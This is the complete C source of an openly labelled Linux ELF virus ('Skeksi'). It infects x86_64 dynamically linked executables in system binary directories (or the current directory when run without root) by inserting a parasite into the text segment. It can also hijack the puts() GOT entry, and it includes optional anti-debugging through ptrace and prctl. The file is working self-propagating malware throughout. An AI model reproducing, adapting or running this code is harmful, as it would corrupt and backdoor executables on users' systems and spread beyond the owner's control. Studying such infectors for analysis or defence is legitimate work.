/*
 * Skeksi Virus v0.1 - infects files that are ELF_X86_64 Linux ET_EXEC's
 * Written by ElfMaster - ryan@bitlackeys.org
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <link.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <time.h>
#include <signal.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/time.h>

#define VIRUS_LAUNCHER_NAME "virus"

struct linux_dirent64 {
        uint64_t             d_ino;
        int64_t             d_off;
        unsigned short  d_reclen;
        unsigned char   d_type;
        char            d_name[0];
} __attribute__((packed));

	

/* libc */ 

void Memset(void *mem, unsigned char byte, unsigned int len);
void _memcpy(void *, void *, unsigned int);
int _printf(char *, ...);
char * itoa(long, char *);
char * itox(long, char *);
int _puts(char *);
int _puts_nl(char *);
size_t _strlen(char *);
char *_strchr(const char *, int);
char * _strrchr(const char *, int);
int _strncmp(const char *, const char *, size_t);
int _strcmp(const char *, const char *);
int _memcmp(const void *, const void *, unsigned int);
char _toupper(char c);


/* syscalls */
long _ptrace(long request, long pid, void *addr, void *data);
int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
int _fstat(long, void *);
int _mprotect(void * addr, unsigned long len, int prot);
long _lseek(long, long, unsigned int);
void Exit(long);
void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
int _munmap(void *, size_t);
long _open(const char *, unsigned long, long);
long _write(long, char *, unsigned long);
int _read(long, char *, unsigned long);
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                    unsigned int count);
int _rename(const char *, const char *);
int _close(unsigned int);
int _gettimeofday(struct timeval *, struct timezone *);

/* Customs */
unsigned long get_rip(void);
void end_code(void);
void dummy_marker(void);
static inline uint32_t get_random_number(int) __attribute__((__always_inline__));

#define PIC_RESOLVE_ADDR(target) (get_rip() - ((char *)&get_rip_label - (char *)target))

#if defined(DEBUG) && DEBUG > 0
 #define DEBUG_PRINT(fmt, args...) _printf("DEBUG: %s:%d:%s(): " fmt, \
    __FILE__, __LINE__, __func__, ##args)
#else
 #define DEBUG_PRINT(fmt, args...) /* Don't do anything in release builds */
#endif

#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE - 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE) 
#define PAGE_ROUND(x) (PAGE_ALIGN_UP(x))
#define STACK_SIZE 0x4000000

#define TMP ".xyz.skeksi.elf64"

#define LUCKY_NUMBER 7
#define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman

#define __ASM__ asm __volatile__

extern long real_start;
extern long get_rip_label;

struct bootstrap_data {
	int argc;
	char **argv;
};

typedef struct elfbin {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Dyn *dyn;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	size_t textSize;
	size_t dataSize;
	Elf64_Off dataOff;
	Elf64_Off textOff;
	uint8_t *mem;
	size_t size;
	char *path;
	struct stat st;
	int fd;
	int original_virus_exe;
} elfbin_t;

#define DIR_COUNT 4

_start()
{
	struct bootstrap_data bootstrap;
	/*
	 * Save register state before executing parasite
	 * code.
	 */
	__ASM__ (
	 ".globl real_start	\n"
 	 "real_start:		\n"
	 "push %rsp	\n"
	 "push %rbp	\n"
	 "push %rax	\n"
	 "push %rbx	\n"
	 "push %rcx	\n"
	 "push %rdx	\n"
	 "push %r8	\n"
	 "push %r9	\n"
	 "push %r10	\n"
	 "push %r11	\n"
	 "push %r12	\n"
	 "push %r13	\n"
	 "push %r14	\n"
	 "push %r15	  ");
	
	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
        __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));

	/*
	 * Load bootstrap pointer as argument to do_main()
	 * and call it.
	 */
	__ASM__ ( 
	 "leaq %0, %%rdi\n"
	 "call do_main   " :: "g"(bootstrap)
	);

	/*
	 * Restore register state
	 */
	__ASM__ (
	 "pop %r15	\n"
	 "pop %r14	\n"
	 "pop %r13	\n"
	 "pop %r12	\n"
	 "pop %r11	\n"
	 "pop %r10	\n"
	 "pop %r9	\n"
	 "pop %r8	\n"
	 "pop %rdx	\n"
	 "pop %rcx	\n"
	 "pop %rbx	\n"
	 "pop %rax	\n"
	 "pop %rbp	\n"
	 "pop %rsp	\n"	
	 "add $0x8, %rsp\n"
	 "jmp end_code	" 
	);
}

/*
 * l33t sp34k version of puts. We infect PLTGOT
 * entry for puts() of infected binaries.
 */

int evil_puts(const char *string)
{
	char *s = (char *)string;
	char new[1024];
	int index = 0;
	int rnum = get_random_number(5);
	if (rnum != 3)
		goto normal;

	Memset(new, 0, 1024);
	while (*s != '\0' && index < 1024) {
		switch(_toupper(*s)) {
			case 'I':
				new[index++] = '1';
				break;
			case 'E':
				new[index++] = '3';
				break;
			case 'S':
				new[index++] = '5';
				break;
			case 'T':
				new[index++] = '7';
				break;
			case 'O':
				new[index++] = '0';
				break;	
			case 'A':
				new[index++] = '4';
				break;
			default:
				new[index++] = *s;
				break;
		}
		s++;
	}
	return _puts_nl(new);
normal:
	return _puts_nl((char *)string);
}

/*
 * Heap areas are created by passing a NULL initialized
 * pointer by reference.  Each heap area maxes out at 4k
 * and it is up to the caller of vx_malloc() to keep track
 * of how much space has been used. For our uses this is
 * perfect.
 */
void * vx_malloc(size_t len, uint8_t **mem)
{
	if (*mem == NULL) {
		*mem = _mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (*mem == MAP_FAILED) {
			DEBUG_PRINT("malloc failed with mmap\n");
			Exit(-1);
		}
	}
	*mem += len;
	**mem = 0;
	return (void *)((char *)*mem - len);
}

static inline void vx_free(uint8_t *mem)
{
	uintptr_t addr = (uintptr_t)mem;
	addr &= ~4095;
	mem = (uint8_t *)addr;
	_munmap(mem, 4096);
}

static inline int _rand(long *seed) // RAND_MAX assumed to be 32767
{
        *seed = *seed * 1103515245 + 12345;
        return (unsigned int)(*seed / 65536) & 32767;
}
/*
 * We rely on ASLR to get our psuedo randomness, since RSP will be different
 * at each execution.
 */
static inline uint32_t get_random_number(int max)
{
	struct timeval tv;
	_gettimeofday(&tv, NULL);
	return _rand(&tv.tv_usec) % max;
}
	
static inline char * randomly_select_dir(char **dirs) 
{	
	return (char *)dirs[get_random_number(DIR_COUNT)];
}

char * full_path(char *exe, char *dir, uint8_t **heap)
{
	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, heap);
	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
	_memcpy(ptr, dir, _strlen(dir));
	ptr[_strlen(dir)] = '/';
	if (*exe == '.' && *(exe + 1) == '/')
		exe += 2;
	_memcpy(&ptr[_strlen(dir) + 1], exe, _strlen(exe));
	return ptr;
}
	
#define JMPCODE_LEN 6

int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t *self, ElfW(Addr) orig_entry_point)
{
	int ofd;
	unsigned int c;
	int i, t = 0, ehdr_size = sizeof(ElfW(Ehdr));
	unsigned char *mem = target->mem;
	unsigned char *parasite = self->mem;
	char *host = target->path, *protected; 
	struct stat st;

	_memcpy((struct stat *)&st, (struct stat *)&target->st, sizeof(struct stat));

        /* eot is: 
         * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
         * end_of_text += p_hdr->p_filesz;
         */ 
        extern int return_entry_start;

        if ((ofd = _open(TMP, O_CREAT|O_WRONLY|O_TRUNC, st.st_mode)) == -1) 
                return -1;
        
        /*
         * Write first 64 bytes of original binary (The elf file header) 
         * [ehdr] 
         */
        if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
		return -1;
        
        /*
         * Now inject the virus
         * [ehdr][virus]
         */
	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
        void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
	int end_code_size = (int)((char *)f2 - (char *)f1);
 	Elf64_Addr end_code_addr = PIC_RESOLVE_ADDR(&end_code);
        uint8_t jmp_patch[6] = {0x68, 0x0, 0x0, 0x0, 0x0, 0xc3};
	*(uint32_t *)&jmp_patch[1] = orig_entry_point;
	/*
	 * Write parasite up until end_code()
	 */
	size_t initial_parasite_len = self->size - 1024;
	initial_parasite_len -= end_code_size;
        
	if ((c = _write(ofd, parasite, initial_parasite_len)) != initial_parasite_len) {
		return -1;
	}
	_write(ofd, jmp_patch, sizeof(jmp_patch));
	_write(ofd, &parasite[initial_parasite_len + sizeof(jmp_patch)], 1024 + (end_code_size - sizeof(jmp_patch)));
  
	/*
         * Seek to end of tracer.o + PAGE boundary  
         * [ehdr][virus][pad]
         */
        uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
        if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
		return -1;
        
        /*
         * Write the rest of the original binary
         * [ehdr][virus][pad][phdrs][text][data][shdrs]
         */
        mem += sizeof(Elf64_Ehdr);
        
        unsigned int final_length = st.st_size - (sizeof(ElfW(Ehdr))); // + target->ehdr->e_shnum * sizeof(Elf64_Shdr));
        if ((c = _write(ofd, mem, final_length)) != final_length) 
		return -1;

	_close(ofd);

	return 0;
}

Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	int fd;
	int text_found = 0, i;
        Elf64_Addr orig_entry_point;
        Elf64_Addr origText;
	Elf64_Addr new_base;
	size_t parasiteSize;
	size_t paddingSize;
	struct stat st;
	char *host = target->path;
	long o_entry_offset;
	/*
	 * Get size of parasite (self)
	 */
        parasiteSize = self->size;
	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
	
	mem = target->mem;
	*(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
	ehdr = (Elf64_Ehdr *)target->ehdr;
	phdr = (Elf64_Phdr *)target->phdr;
	shdr = (Elf64_Shdr *)target->shdr;
	orig_entry_point = ehdr->e_entry;
	
	phdr[0].p_offset += paddingSize;
        phdr[1].p_offset += paddingSize;
        
        for (i = 0; i < ehdr->e_phnum; i++) {
                if (text_found)
                        phdr[i].p_offset += paddingSize;
        
                if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
                                origText = phdr[i].p_vaddr;
                                phdr[i].p_vaddr -= paddingSize;
                                new_base = phdr[i].p_vaddr;
				phdr[i].p_paddr -= paddingSize;
                                phdr[i].p_filesz += paddingSize;
                                phdr[i].p_memsz += paddingSize;
				//phdr[i].p_flags |= PF_W;
                                text_found = 1;
                }
        }
        if (!text_found) {
                DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
                return -1;
        }
	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];
	for (i = 0; i < ehdr->e_shnum; i++) {
#if DEBUG
                if (!_strncmp((char *)&StringTable[shdr[i].sh_name], ".text", 5)) {
                        shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
			shdr[i].sh_addr = origText - paddingSize;
			shdr[i].sh_addr += sizeof(ElfW(Ehdr));
                        shdr[i].sh_size += self->size;
                }  
                else 
#endif
		shdr[i].sh_offset += paddingSize;

	}
	ehdr->e_shoff += paddingSize;
	ehdr->e_phoff += paddingSize;
	
	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);
	
	return new_base;
}
/*
 * Since our parasite exists of both a text and data segment
 * we include the initial ELF file header and phdr in each parasite
 * insertion. This lends itself well to being able to self-load by
 * parsing our own program headers etc.
 */
int load_self(elfbin_t *elf)
{	
	int i;
	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
	Elf64_Addr _start_addr = PIC_RESOLVE_ADDR(&_start);
	elf->mem = (uint8_t *)_start_addr;
	elf->size = (char *)&end_code - (char *)&_start; 
	elf->size += (int)((char *)f2 - (char *)f1);
	elf->size += 1024; // So we have .rodata included in parasite insertion
	return 0;
}

void unload_target(elfbin_t *elf)
{
	_munmap(elf->mem, elf->size);
	_close(elf->fd);
}

int load_target(const char *path, elfbin_t *elf)
{
	int i;
	struct stat st;
	elf->path = (char *)path;
	int fd = _open(path, O_RDONLY, 0);
	if (fd < 0)
		return -1;
	elf->fd = fd;
	if (_fstat(fd, &st) < 0)
		return -1;
	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (elf->mem == MAP_FAILED)
		return -1;
	elf->ehdr = (Elf64_Ehdr *)elf->mem;
	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
	for (i = 0; i < elf->ehdr->e_phnum; i++) {
		switch(elf->phdr[i].p_type) {	
			case PT_LOAD:
				switch(!!elf->phdr[i].p_offset) {
                        	case 0:
                                	elf->textVaddr = elf->phdr[i].p_vaddr;
                                	elf->textSize = elf->phdr[i].p_memsz;
                                	break;
                               	case 1:
                                	elf->dataVaddr = elf->phdr[i].p_vaddr;
                                	elf->dataSize = elf->phdr[i].p_memsz;
                                	elf->dataOff = elf->phdr[i].p_offset;
					break;
                        }
				break;
			case PT_DYNAMIC:
				elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
				break;
		}
			
        }
	elf->st = st;
	elf->size = st.st_size;
	return 0;
}

int load_target_writeable(const char *path, elfbin_t *elf)
{
        int i;
        struct stat st;
        elf->path = (char *)path;
        int fd = _open(path, O_RDWR, 0);
        if (fd < 0)
                return -1;
        elf->fd = fd;
        if (_fstat(fd, &st) < 0)
                return -1;
        elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
        if (elf->mem == MAP_FAILED)
                return -1;
        elf->ehdr = (Elf64_Ehdr *)elf->mem;
        elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
        elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
        for (i = 0; i < elf->ehdr->e_phnum; i++) {
                switch(elf->phdr[i].p_type) {
                        case PT_LOAD:
                                switch(!!elf->phdr[i].p_offset) {
                                case 0:
                                        elf->textVaddr = elf->phdr[i].p_vaddr;
                                        elf->textSize = elf->phdr[i].p_memsz;
                                        break;
                                case 1:
                                        elf->dataVaddr = elf->phdr[i].p_vaddr;
                                        elf->dataSize = elf->phdr[i].p_memsz;
                                        elf->dataOff = elf->phdr[i].p_offset;
                                        break;
                        }
                                break;
                        case PT_DYNAMIC:
                                elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
                                break;
                }

        }
        elf->st = st;
        elf->size = st.st_size;
        return 0;
}
/* 
 * We hook puts() for l33t sp34k 0utput. We parse the phdr's dynamic segment
 * directly so we can still infect programs that are stripped of section header
 * tables.
 */
int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
{
	int i, symindex = -1;	
	Elf64_Sym *symtab;
	Elf64_Rela *jmprel;
	Elf64_Dyn *dyn = target->dyn;
	Elf64_Addr *gotentry, *pltgot;
	char *strtab;
	size_t strtab_size;
	size_t jmprel_size;
	Elf64_Addr gotaddr;
	Elf64_Off gotoff;
	
	for (i = 0; dyn[i].d_tag != DT_NULL; i++) {
		switch(dyn[i].d_tag) {
			case DT_SYMTAB: // relative to the text segment base
				symtab = (Elf64_Sym *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];			
				break;
			case DT_PLTGOT: // relative to the data segment base
				pltgot = (long *)&target->mem[target->dataOff + (dyn[i].d_un.d_ptr - target->dataVaddr)];
				break;
			case DT_STRTAB: // relative to the text segment base
				strtab = (char *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				break;
			case DT_STRSZ:
				strtab_size = (size_t)dyn[i].d_un.d_val;
				break;
			case DT_JMPREL:
				jmprel = (Elf64_Rela *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				break;
			case DT_PLTRELSZ:
				jmprel_size = (size_t)dyn[i].d_un.d_val;
				break;
	
		}
	}
	if (symtab == NULL || pltgot == NULL) {
		DEBUG_PRINT("Unable to locate symtab or pltgot\n");
		return -1;
	}
	
	for (i = 0; symtab[i].st_name <= strtab_size; i++) {
		if (!_strcmp(&strtab[symtab[i].st_name], "puts")) {
			symindex = i;
			break;
		}	
	}
	if (symindex == -1) {
		DEBUG_PRINT("cannot find puts()\n");
		return -1;
	}
	for (i = 0; i < jmprel_size / sizeof(Elf64_Rela); i++) {
		if (ELF64_R_SYM(jmprel->r_info) == symindex) { // found rel entry for puts()
			gotaddr = jmprel->r_offset;
			gotoff = target->dataOff + (jmprel->r_offset - target->dataVaddr);
			break;
		}
	}
	if (gotaddr == 0) {
		DEBUG_PRINT("Couldn't find relocation entry for puts\n");
		return -1;
	}
	
	gotentry = (Elf64_Addr *)&target->mem[gotoff];
	*gotentry = new_fn_addr;
	
	DEBUG_PRINT("patched GOT entry %x with address %x\n", gotaddr, new_fn_addr);
	return 0;
	
}
/*
 * Must be ELF
 * Must be ET_EXEC
 * Must be dynamically linked
 * Must not yet be infected
 */
int check_criteria(char *filename)
{
	int fd, dynamic, i, ret = 0;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[4096];
	uint32_t magic;
	
	fd = _open(filename, O_RDONLY, 0);
	if (fd < 0) 
		return -1;
	if (_read(fd, mem, 4096) < 0)
		return -1;
	_close(fd);
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) {
		DEBUG_PRINT("not an ELF\n");
		return -1;
	}
	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
	if (magic == MAGIC_NUMBER) { //already infected? Then skip this file
		DEBUG_PRINT("is infected\n");
		return -1;
	}
	if (ehdr->e_machine != EM_X86_64) {
		DEBUG_PRINT("not x86_64\n");
		return -1;
	}
	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
		if (phdr[i].p_type == PT_DYNAMIC)	
			dynamic++;
	if (!dynamic) {
		DEBUG_PRINT("not dynamic\n");
		return -1;
	}
	return 0;

}

void do_main(struct bootstrap_data *bootstrap)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem, *heap = NULL;
	long new_base, base_addr, evilputs_addr, evilputs_offset;
	struct linux_dirent64 *d;
	int bpos, fcount, dd, nread;
	char *dir = NULL, **files, *fpath, dbuf[1024];
	struct stat st;
	mode_t mode;
	uint32_t rnum;
	elfbin_t self, target;
	int icount = 0;
	int paddingSize;
	/*
	 * NOTE: 
	 * we can't use string literals because they will be
	 * stored in either .rodata or .data sections.
	 */
	char dirs[4][32] = {
			{'/','s','b','i','n','\0'},
			{'/','u','s','r','/','b','i','n','\0'},
			{'/','u','s','r','/','s','b','i','n','\0'},        
			{'/','b','i','n','\0'}
			};
	char cwd[2] = {'.', '\0'};
	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
	
	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
	
	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0);
	if (dd < 0) {
		DEBUG_PRINT("open failed\n");
		return;
	}
	
	load_self(&self);
	
#if ANTIDEBUG
	if (_ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
		_printf("!! Skeksi Virus, 2015 !!\n");
		Exit(-1);
	}
	_prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
#endif

	for (;;) {
		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 4096);
		if (nread < 0) {
			DEBUG_PRINT("getdents64 failed\n");
			return;
		}
		if (nread == 0)
			break;
		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
			d = (struct linux_dirent64 *) (dbuf + bpos);
    			bpos += d->d_reclen - 1;
			if (!_strcmp(d->d_name, &bootstrap->argv[0][2])) {
				continue;
			}
			if (d->d_name[0] == '.')
				continue;
			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
				continue;
			if (!_strcmp(&bootstrap->argv[0][2], VIRUS_LAUNCHER_NAME) && icount == 0)
				goto infect;
			rnum = get_random_number(10);
                        if (rnum != LUCKY_NUMBER)
                                continue;
infect:
			load_target(fpath, &target);
			new_base = infect_elf_file(&self, &target);
			unload_target(&target);
#ifdef INFECT_PLTGOT
			load_target_writeable(TMP, &target);
			base_addr = PIC_RESOLVE_ADDR(&_start);
			evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
			evilputs_offset = evilputs_addr - base_addr;
			infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr));
			unload_target(&target);
#endif

			_rename(TMP, fpath);
			icount++;
		}
		
	}
}

int _getuid(void)
{
        unsigned long ret;
        __asm__ volatile("mov $102, %rax\n"
                         "syscall");
         asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

void Exit(long status)
{
        __asm__ volatile("mov %0, %%rdi\n"
                         "mov $60, %%rax\n"
                         "syscall" : : "r"(status));
}

long _open(const char *path, unsigned long flags, long mode)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
                        "mov $2, %%rax\n"
                        "syscall" : : "g"(path), "g"(flags), "g"(mode));
        asm ("mov %%rax, %0" : "=r"(ret));              
        
        return ret;
}

int _close(unsigned int fd)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov $3, %%rax\n"
                        "syscall" : : "g"(fd));
        return (int)ret;
}

int _read(long fd, char *buf, unsigned long len)
{
         long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $0, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

long _write(long fd, char *buf, unsigned long len)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $1, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return ret;
}

int _fstat(long fd, void *buf)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $5, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _unlink(const char *path)
{
	   long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
			"mov $87, %%rax\n"		
			"syscall" ::"g"(path));
	asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _rename(const char *old, const char *new)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $82, %%rax\n"
                        "syscall" ::"g"(old),"g"(new));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

long _lseek(long fd, long offset, unsigned int whence)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $8, %%rax\n"
                        "syscall" : : "g"(fd), "g"(offset), "g"(whence));
        asm("mov %%rax, %0" : "=r"(ret));
        return ret;

}

int _fsync(int fd)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov $74, %%rax\n"
                        "syscall" : : "g"(fd));

        asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
        long mmap_fd = fd;
        unsigned long mmap_off = off;
        unsigned long mmap_flags = flags;
        unsigned long ret;

        __asm__ volatile(
                         "mov %0, %%rdi\n"
                         "mov %1, %%rsi\n"
                         "mov %2, %%rdx\n"
                         "mov %3, %%r10\n"
                         "mov %4, %%r8\n"
                         "mov %5, %%r9\n"
                         "mov $9, %%rax\n"
                         "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
        asm ("mov %%rax, %0" : "=r"(ret));              
        return (void *)ret;
}

int _munmap(void *addr, size_t len)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $11, %%rax\n"
                        "syscall" :: "g"(addr), "g"(len));
        asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _mprotect(void * addr, unsigned long len, int prot)
{
        unsigned long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $10, %%rax\n"
                        "syscall" : : "g"(addr), "g"(len), "g"(prot));
        asm("mov %%rax, %0" : "=r"(ret));
        
        return (int)ret;
}

long _ptrace(long request, long pid, void *addr, void *data)
{
        long ret;

        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov %3, %%r10\n"
                        "mov $101, %%rax\n"
                        "syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data));
        asm("mov %%rax, %0" : "=r"(ret));
        
        return ret;
}

int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
        long ret;
        
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov %3, %%r10\n"
                        "mov $157, %%rax\n"
                        "syscall\n" :: "g"(option), "g"(arg2), "g"(arg3), "g"(arg4), "g"(arg5));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                    unsigned int count)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $217, %%rax\n"
                        "syscall" :: "g"(fd), "g"(dirp), "g"(count));
        asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _gettimeofday(struct timeval *tv, struct timezone *tz)
{
	long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $96, %%rax\n"
			"syscall" :: "g"(tv), "g"(tz));
	asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;

}

void _memcpy(void *dst, void *src, unsigned int len)
{
        int i;
        unsigned char *s = (unsigned char *)src;
        unsigned char *d = (unsigned char *)dst;

        for (i = 0; i < len; i++) {
                *d = *s;
                s++, d++;
        }

}


void Memset(void *mem, unsigned char byte, unsigned int len)
{
        unsigned char *p = (unsigned char *)mem; 
        int i = len;
        while (i--) {
                *p = byte;
                p++;
        }
}

int _printf(char *fmt, ...)
{
        int in_p;
        unsigned long dword;
        unsigned int word;
        char numbuf[26] = {0};
        __builtin_va_list alist;

        in_p;
        __builtin_va_start((alist), (fmt));

        in_p = 0;
        while(*fmt) {
                if (*fmt!='%' && !in_p) {
                        _write(1, fmt, 1);
                        in_p = 0;
                }
                else if (*fmt!='%') {
                        switch(*fmt) {
                                case 's':
                                        dword = (unsigned long) __builtin_va_arg(alist, long);
                                        _puts((char *)dword);
                                        break;
                                case 'u':
                                        word = (unsigned int) __builtin_va_arg(alist, int);
                                        _puts(itoa(word, numbuf));
                                        break;
                                case 'd':
                                        word = (unsigned int) __builtin_va_arg(alist, int);
                                        _puts(itoa(word, numbuf));
                                        break;
                                case 'x':
                                        dword = (unsigned long) __builtin_va_arg(alist, long);
                                        _puts(itox(dword, numbuf));
                                        break;
                                default:
                                        _write(1, fmt, 1);
                                        break;
                        }
                        in_p = 0;
                }
                else {
                        in_p = 1;
                }
                fmt++;
        }
        return 1;
}
char * itoa(long x, char *t)
{
        int i;
        int j;

        i = 0;
        do
        {
                t[i] = (x % 10) + '0';
                x /= 10;
                i++;
        } while (x!=0);

        t[i] = 0;

        for (j=0; j < i / 2; j++) {
                t[j] ^= t[i - j - 1];
                t[i - j - 1] ^= t[j];
                t[j] ^= t[i - j - 1];
        }

        return t;
}
char * itox(long x, char *t)
{
        int i;
        int j;

        i = 0;
        do
        {
                t[i] = (x % 16);

                /* char conversion */
                if (t[i] > 9)
                        t[i] = (t[i] - 10) + 'a';
                else
                        t[i] += '0';

                x /= 16;
                i++;
        } while (x != 0);

        t[i] = 0;

        for (j=0; j < i / 2; j++) {
                t[j] ^= t[i - j - 1];
                t[i - j - 1] ^= t[j];
                t[j] ^= t[i - j - 1];
        }

        return t;
}

int _puts(char *str)
{
        _write(1, str, _strlen(str));
        _fsync(1);

        return 1;
}

int _puts_nl(char *str)
{	
        _write(1, str, _strlen(str));
	_write(1, "\n", 1);
	_fsync(1);

        return 1;
}

size_t _strlen(char *s)
{
        size_t sz;

        for (sz=0;s[sz];sz++);
        return sz;
}

	

char _toupper(char c)
{
	if( c >='a' && c <= 'z')
		return (c = c +'A' - 'a');
	return c;
	
}

      
